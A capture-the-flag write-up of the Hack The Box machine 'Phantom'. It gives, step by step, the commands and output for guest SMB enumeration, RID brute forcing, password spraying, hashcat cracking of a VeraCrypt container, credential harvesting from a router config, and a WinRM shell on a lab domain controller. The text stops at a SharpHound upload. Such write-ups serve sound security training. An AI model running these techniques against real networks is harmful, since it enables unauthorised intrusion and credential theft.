---
title: "Hack The Box: Phantom"
date: 2025-11-27
summary: "A Medium Windows-based machine where the target is compromised by extracting a default password from a welcome email PDF in a public SMB share and spraying it against RID brute-forced usernames. Enumerating a VeraCrypt container found in an IT backup share reveals Linux backup configurations with cleartext credentials for WinRM access. Domain administrative compromise is achieved by resetting the password of an account with AddAllowedToAct rights and executing a SPN-less Resource-Based Constrained Delegation (RBCD) attack to request a Kerberos service ticket for DCSync."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Phantom"
tags:
  - ace-addallowedtoact
  - ace-forcechangepassword
  - active-directory
  - bloodhound
  - credentials-in-configuration-files
  - credentials-in-public-shares
  - custom-wordlists
  - dcsync
  - evil-winrm
  - hashcat
  - impacket-changepassword
  - impacket-describeticket
  - impacket-getst
  - impacket-gettgt
  - impacket-rbcd
  - maq-is-0
  - net-rpc
  - netexec
  - nmap
  - null-guest-authentication
  - password-spraying
  - pypykatz
  - rbcd
  - sharphound
  - smbclient
  - veracrypt
---

### Provided Information

Attacker IP: 10.10.14.125

Target IP: 10.129.234.63

Note: "Should you need to crack a hash, use a short custom wordlist based on company name and simple mutation rules commonly seen in real life passwords (e.g. year and a special character)."

### Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp 10.129.234.63
<SNIP>
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-27 05:45:47Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.phantom.vl
| Issuer: commonName=DC.phantom.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-26T04:53:55
| Not valid after:  2026-05-28T04:53:55
| MD5:   4552:0716:884a:6c73:85d0:f1fd:c073:7394
| SHA-1: 6bac:dc43:0e56:7b02:7fad:e626:b7e7:0d2e:2296:979f
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-27T05:46:41+00:00; +4h07m44s from scanner time.
| rdp-ntlm-info:
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-27T05:46:00+00:00
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 17022/tcp): CLEAN (Timeout)
|   Check 2 (port 48867/tcp): CLEAN (Timeout)
|   Check 3 (port 17084/udp): CLEAN (Timeout)
|   Check 4 (port 18874/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-27T05:46:07
|_  start_date: N/A
|_clock-skew: mean: 4h07m43s, deviation: 0s, median: 4h07m43s
<SNIP>
```

As expected, the target is a Domain Controller.

Let’s sync the time with the target:

```bash
$ sudo ntpdate 10.129.234.63
2025-11-27 09:47:21.989649 (+0400) +14864.581449 +/- 0.101693 10.129.234.63 s1 no-leap
CLOCK: time stepped by 14864.581449
```

And let’s generate a hosts file for `/etc/hosts`:

```bash
$ netexec smb 10.129.234.63 --generate-hosts-file hosts
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)

$ cat hosts | sudo tee -a /etc/hosts
10.129.234.63     DC.phantom.vl phantom.vl DC
```

### Enumerating SMB

Let’s start by checking what shares can null or guest accounts access:

```bash
$ netexec smb 10.129.234.63 -u '' -p '' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\:
SMB         10.129.234.63   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

$ netexec smb 10.129.234.63 -u guest -p '' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest:
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
```

Both null and guest authentication attempts worked.

Null can’t access any share, while guest can access a non-default share called Public.

Let’s check this share’s contents:

```bash
$ smbclient //phantom.vl/Public -U guest%
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 11 19:03:14 2024
  ..                                DHS        0  Thu Aug 14 15:55:49 2025
  tech_support_email.eml              A    14565  Sat Jul  6 20:08:43 2024
```

Interesting, an email.

Let’s download it and read its contents:

```bash
smb: \> get tech_support_email.eml
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (17.3 KiloBytes/sec) (average 17.3 KiloBytes/sec)
smb: \> exit

$ cat tech_support_email.eml
Content-Type: multipart/mixed; boundary="===============6932979162079994354=="
MIME-Version: 1.0
From: alucas@phantom.vl
To: techsupport@phantom.vl
Date: Sat, 06 Jul 2024 12:02:39 -0000
Subject: New Welcome Email Template for New Employees

--===============6932979162079994354==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Dear Tech Support Team,

I have finished the new welcome email template for onboarding new employees.

Please find attached the example template. Kindly start using this template for all new employees.

Best regards,
Anthony Lucas

--===============6932979162079994354==
Content-Type: application/pdf
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="welcome_template.pdf"

JVBERi0x<SNIP>
```

The email contains interesting information:

- Possible username: alucas (Anthony Lucas) → the domain follows the `flast` username pattern
- Some group: techsupport
- Base64-encoded PDF file containing welcoming data for new employees (possibly containing default credentials)

Let’s decode the base64 data and check its content out:

```bash
$ echo JVBERi0x<SNIP> | base64 -d > email.pdf

$ file email.pdf
email.pdf: PDF document, version 1.7, 1 page(s)
```

![Figure 1](/assets/images/writeups/hack-the-box-phantom/hack-the-box-phantom-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Nice, there is a default password.

### Password Spraying and Exploiting Ibryant

Let’s see if we can collect some domain users through brute forcing RIDs:

```bash
$ netexec smb phantom.vl -u guest -p '' --rid-brute
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest:
SMB         10.129.234.63   445    DC               498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               500: PHANTOM\Administrator (SidTypeUser)
SMB         10.129.234.63   445    DC               501: PHANTOM\Guest (SidTypeUser)
SMB         10.129.234.63   445    DC               502: PHANTOM\krbtgt (SidTypeUser)
SMB         10.129.234.63   445    DC               512: PHANTOM\Domain Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               513: PHANTOM\Domain Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               514: PHANTOM\Domain Guests (SidTypeGroup)
SMB         10.129.234.63   445    DC               515: PHANTOM\Domain Computers (SidTypeGroup)
SMB         10.129.234.63   445    DC               516: PHANTOM\Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               517: PHANTOM\Cert Publishers (SidTypeAlias)
SMB         10.129.234.63   445    DC               518: PHANTOM\Schema Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               519: PHANTOM\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               520: PHANTOM\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.63   445    DC               521: PHANTOM\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               522: PHANTOM\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               525: PHANTOM\Protected Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               526: PHANTOM\Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               527: PHANTOM\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               553: PHANTOM\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.63   445    DC               571: PHANTOM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               572: PHANTOM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               1000: PHANTOM\DC$ (SidTypeUser)
SMB         10.129.234.63   445    DC               1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         10.129.234.63   445    DC               1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.63   445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
SMB         10.129.234.63   445    DC               1104: PHANTOM\TechSupports (SidTypeGroup)
SMB         10.129.234.63   445    DC               1105: PHANTOM\Server Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               1106: PHANTOM\ICT Security (SidTypeGroup)
SMB         10.129.234.63   445    DC               1107: PHANTOM\DevOps (SidTypeGroup)
SMB         10.129.234.63   445    DC               1108: PHANTOM\Accountants (SidTypeGroup)
SMB         10.129.234.63   445    DC               1109: PHANTOM\FinManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1110: PHANTOM\EmployeeRelations (SidTypeGroup)
SMB         10.129.234.63   445    DC               1111: PHANTOM\HRManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1112: PHANTOM\rnichols (SidTypeUser)
SMB         10.129.234.63   445    DC               1113: PHANTOM\pharrison (SidTypeUser)
SMB         10.129.234.63   445    DC               1114: PHANTOM\wsilva (SidTypeUser)
SMB         10.129.234.63   445    DC               1115: PHANTOM\elynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1116: PHANTOM\nhamilton (SidTypeUser)
SMB         10.129.234.63   445    DC               1117: PHANTOM\lstanley (SidTypeUser)
SMB         10.129.234.63   445    DC               1118: PHANTOM\bbarnes (SidTypeUser)
SMB         10.129.234.63   445    DC               1119: PHANTOM\cjones (SidTypeUser)
SMB         10.129.234.63   445    DC               1120: PHANTOM\agarcia (SidTypeUser)
SMB         10.129.234.63   445    DC               1121: PHANTOM\ppayne (SidTypeUser)
SMB         10.129.234.63   445    DC               1122: PHANTOM\ibryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1123: PHANTOM\ssteward (SidTypeUser)
SMB         10.129.234.63   445    DC               1124: PHANTOM\wstewart (SidTypeUser)
SMB         10.129.234.63   445    DC               1125: PHANTOM\vhoward (SidTypeUser)
SMB         10.129.234.63   445    DC               1126: PHANTOM\crose (SidTypeUser)
SMB         10.129.234.63   445    DC               1127: PHANTOM\twright (SidTypeUser)
SMB         10.129.234.63   445    DC               1128: PHANTOM\fhanson (SidTypeUser)
SMB         10.129.234.63   445    DC               1129: PHANTOM\cferguson (SidTypeUser)
SMB         10.129.234.63   445    DC               1130: PHANTOM\alucas (SidTypeUser)
SMB         10.129.234.63   445    DC               1131: PHANTOM\ebryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1132: PHANTOM\vlynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1133: PHANTOM\ghall (SidTypeUser)
SMB         10.129.234.63   445    DC               1134: PHANTOM\ssimpson (SidTypeUser)
SMB         10.129.234.63   445    DC               1135: PHANTOM\ccooper (SidTypeUser)
SMB         10.129.234.63   445    DC               1136: PHANTOM\vcunningham (SidTypeUser)
SMB         10.129.234.63   445    DC               1137: PHANTOM\SSPR Service (SidTypeGroup)
```

Nice. Let’s save the output in a file and filter for usernames:

```bash
$ cat rid_dump | grep -ia sidtypeuser | cut -d \\ -f 2 | cut -d ' ' -f 1 | tee usernames
Administrator
Guest
krbtgt
DC$
svc_sspr
rnichols
pharrison
wsilva
elynch
nhamilton
lstanley
bbarnes
cjones
agarcia
ppayne
ibryant
ssteward
wstewart
vhoward
crose
twright
fhanson
cferguson
alucas
ebryant
vlynch
ghall
ssimpson
ccooper
vcunningham
```

Now let’s perform a password spray:

```bash
$ netexec smb phantom.vl -u usernames -p 'Ph4<REDACTED>' --continue-on-success
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\svc_sspr:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4<REDACTED>
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wstewart:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\vhoward:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\crose:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\twright:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\fhanson:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\cferguson:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\alucas:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ebryant:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\vlynch:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ghall:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssimpson:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ccooper:Ph4<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\vcunningham:Ph4<REDACTED> STATUS_LOGON_FAILURE
```

Nice, we got a hit on Ibryant.

### Exploiting Svc_sspr

### Cracking a VeraCrypt File

Let’s see if this user can access any share:

```bash
$ netexec smb phantom.vl -u ibryant -p 'Ph4<REDACTED>' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4<REDACTED>
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```

Nice, the Departments Share is readable.

Let’s check its contents:

```bash
$ smbclient //phantom.vl/"Departments Share" -U 'ibryant%Ph4<REDACTED>'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul  6 20:25:31 2024
  ..                                DHS        0  Thu Aug 14 15:55:49 2025
  Finance                             D        0  Sat Jul  6 20:25:11 2024
  HR                                  D        0  Sat Jul  6 20:21:31 2024
  IT                                  D        0  Thu Jul 11 18:59:02 2024
```

Let’s download all of those recursively:

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
<SNIP>
```

```bash
$ tree
.
├── Finance
│   ├── Expense_Reports.pdf
│   ├── Invoice-Template.pdf
│   └── TaxForm.pdf
├── HR
│   ├── Employee-Emergency-Contact-Form.pdf
│   ├── EmployeeHandbook.pdf
│   ├── Health_Safety_Information.pdf
│   └── NDA_Template.pdf
└── IT
    ├── Backup
    │   └── IT_BACKUP_201123.hc
    ├── mRemoteNG-Installer-1.76.20.24615.msi
    ├── TeamViewerQS_x64.exe
    ├── TeamViewer_Setup_x64.exe
    ├── veracrypt-1.26.7-Ubuntu-22.04-amd64.deb
    └── Wireshark-4.2.5-x64.exe
```

After checking all PDFs none of them contain useful data.

The file inside the IT/Backup directory seems promising.

The extension seems weird. I asked ChatGPT about it and it suggested that the file is a mountable [VeraCrypt](https://github.com/veracrypt/VeraCrypt) file.

Let’s install the latest version of VeraCrypt to be able to interact with the file (or you can install it using the `.deb` package that was found in the share):

```bash
$ wget https://github.com/veracrypt/VeraCrypt/releases/download/VeraCrypt_1.26.24/veracrypt-1.26.24-Debian-12-amd64.deb && sudo apt install ./veracrypt-1.26.24-Debian-12-amd64.deb
```

Now let’s try mounting the file:

```bash
$ veracrypt --text --mount IT_BACKUP_201123.hc .
Enter password for /home/kali/Desktop/htb/phantom/smb_departments_share/IT/Backup/IT_BACKUP_201123.hc:
```

So it requires a password. Let’s attempt cracking it.

Recall that the machine’s provided information suggested using company name and some mutations with years and special characters when attempting hash cracking.

I used the following base file:

```bash
$ cat base.txt                       
phantom
Phantom
PHANTOM
phant0m
ph4ntom
ph4nt0m
pHantom
phantom1
```

And the following rules file:

```bash
$ cat rules.rule   
$2$0$2$2$!
$!$2$0$2$2
^2^2^0^2$!
^2^2^0^2^!
$2$0$2$2$@
$@$2$0$2$2
^2^2^0^2$@
^2^2^0^2^@
$2$0$2$2$#
$#$2$0$2$2
^2^2^0^2$#
^2^2^0^2^#
$2$0$2$2$$
$$$2$0$2$2
^2^2^0^2$$
^2^2^0^2^$
$2$0$2$3$!
$!$2$0$2$3
^3^2^0^2$!
^3^2^0^2^!
$2$0$2$3$@
$@$2$0$2$3
^3^2^0^2$@
^3^2^0^2^@
$2$0$2$3$#
$#$2$0$2$3
^3^2^0^2$#
^3^2^0^2^#
$2$0$2$3$$
$$$2$0$2$3
^3^2^0^2$$
^3^2^0^2^$
$2$0$2$4$!
$!$2$0$2$4
^4^2^0^2$!
^4^2^0^2^!
$2$0$2$4$@
$@$2$0$2$4
^4^2^0^2$@
^4^2^0^2^@
$2$0$2$4$#
$#$2$0$2$4
^4^2^0^2$#
^4^2^0^2^#
$2$0$2$4$$
$$$2$0$2$4
^4^2^0^2$$
^4^2^0^2^$
$2$0$2$5$!
$!$2$0$2$5
^5^2^0^2$!
^5^2^0^2^!
$2$0$2$5$@
$@$2$0$2$5
^5^2^0^2$@
^5^2^0^2^@
$2$0$2$5$#
$#$2$0$2$5
^5^2^0^2$#
^5^2^0^2^#
$2$0$2$5$$
$$$2$0$2$5
^5^2^0^2$$
^5^2^0^2^$
```

Then I used `hashcat` to combine the base and the rules:

```bash
$ hashcat --stdout base.txt -r rules.rule > wordlist.txt
```

And finally attempted cracking the file:

```bash
$ hashcat -m 13721 IT_BACKUP_201123.hc wordlist.txt 
<SNIP>

IT_BACKUP_201123.hc:Phan<REDACTED>                        
                                                          
Session..........: hashcat
Status...........: Cracked
<SNIP>
```

Nice, the file was successfully cracked.

Let’s mount the file and check its contents:

```bash
$ sudo mkdir /mnt/veracrypt && sudo veracrypt IT_BACKUP_201123.hc /mnt/veracrypt --password='Phan<REDACTED>'

$ ls /mnt/veracrypt
'$RECYCLE.BIN'         azure_vms_1023.json   azure_vms_1123.json   splunk_logs_1102  'System Volume Information'    vyos_backup.tar.gz
 azure_vms_0805.json   azure_vms_1104.json   splunk_logs_1003      splunk_logs1203    ticketing_system_backup.zip
```

All of those files seem interesting, but the backup file is the most interesting.

Let’s extract its contents into a new folder and check what is revealed:

```bash
$ cp /mnt/veracrypt/vyos_backup.tar.gz .

$ gunzip vyos_backup.tar.gz

$ tar xf vyos_backup.tar
tar: run/systemd/inaccessible/blk: Cannot mknod: Operation not permitted
tar: Exiting with failure status due to previous errors

$ ls
bin  config  etc  home  lib  lib64  media  mnt  opt  root  run  sbin  srv  tmp  var  vyos_backup.tar
```

This seems to be a Linux filesystem.

### Identifying a Set of Credentials

The filesystem is large and contains lots of file and data. Eventually, the `config/config.boot` file contains some interesting data:

```bash
$ cat config/config.boot
<SNIP>
system {
    config-management {
        commit-revisions "100"
    }
    console {
        device ttyS0 {
            speed "115200"
        }
    }
    host-name "vyos"
    login {
        user admin {
            authentication {
                encrypted-password "$6$rounds=656000$6diBtl<REDACTED>"
            }
        }
        user vyos {
            authentication {
                encrypted-password "$6$rounds=656000$Etl2fr<REDACTED>"
                plaintext-password ""
            }
        }
    }
    syslog {
        global {
            facility all {
                level "info"
            }
            facility local7 {
                level "debug"
            }
        }
    }
}
vpn {
    sstp {
        authentication {
            local-users {
                username lstanley {
                    password "gB6XT<REDACTED>"
                }
            }
<SNIP>
```

This file contains multiple sets of credentials. Two passwords are encrypted and one isn’t.

Since lstanley is a domain user as seen in the RID brute force, and its password is not encrypted, let’s focus on it for now.

First, let’s verify its credentials:

```bash
$ netexec smb phantom.vl -u lstanley -p gB6XT<REDACTED>
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XT<REDACTED> STATUS_LOGON_FAILURE
```

Failure.

### Password Spraying

Let’s spray the password on the domain users:

```bash
$ netexec smb phantom.vl -u usernames -p gB6XT<REDACTED>--continue-on-success
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XT<REDACTED>
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ibryant:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wstewart:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\vhoward:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\crose:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\twright:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\fhanson:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\cferguson:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\alucas:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ebryant:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\vlynch:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ghall:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssimpson:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ccooper:gB6XT<REDACTED>STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\vcunningham:gB6XT<REDACTED>STATUS_LOGON_FAILURE
```

Nice, Svc_sspr got a hit.

### RCE as Svc_sspr

Let’s check if this user can WinRM:

```bash
$ netexec winrm phantom.vl -u svc_sspr -p gB6XT<REDACTED>
WINRM       10.129.234.63   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
WINRM       10.129.234.63   5985   DC               [+] phantom.vl\svc_sspr:gB6XT<REDACTED> (Pwn3d!)
```

Fantastic. Let’s use `evil-winrm` to gain a shell and read `user.txt`:

```bash
$ evil-winrm -i phantom.vl -u svc_sspr -p gB6XT<REDACTED>                                                          
<SNIP>
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> ls

    Directory: C:\Users\svc_sspr\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/26/2025   8:54 PM             34 user.txt

*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> cat user.txt
48bd66<REDACTED>
```

### Bloodhound Enumeration

Now that we’ve compromised multiple users, it is about time to map the domain using `bloodhound`.

Since we’ve got access to the system, let’s use `sharphound` as it is generally more accurate than `bloodhound-ce-python`:

```bash
*Evil-WinRM* PS C:\users\svc_sspr\desktop> upload github/SharpHound.exe
Info: Uploading /home/kali/Desktop/htb/phantom/github/SharpHound.exe to C:\users\svc_sspr\desktop\SharpHound.exe
Data: 1755136 bytes of 1755136 bytes copied
Info: Upload successful!

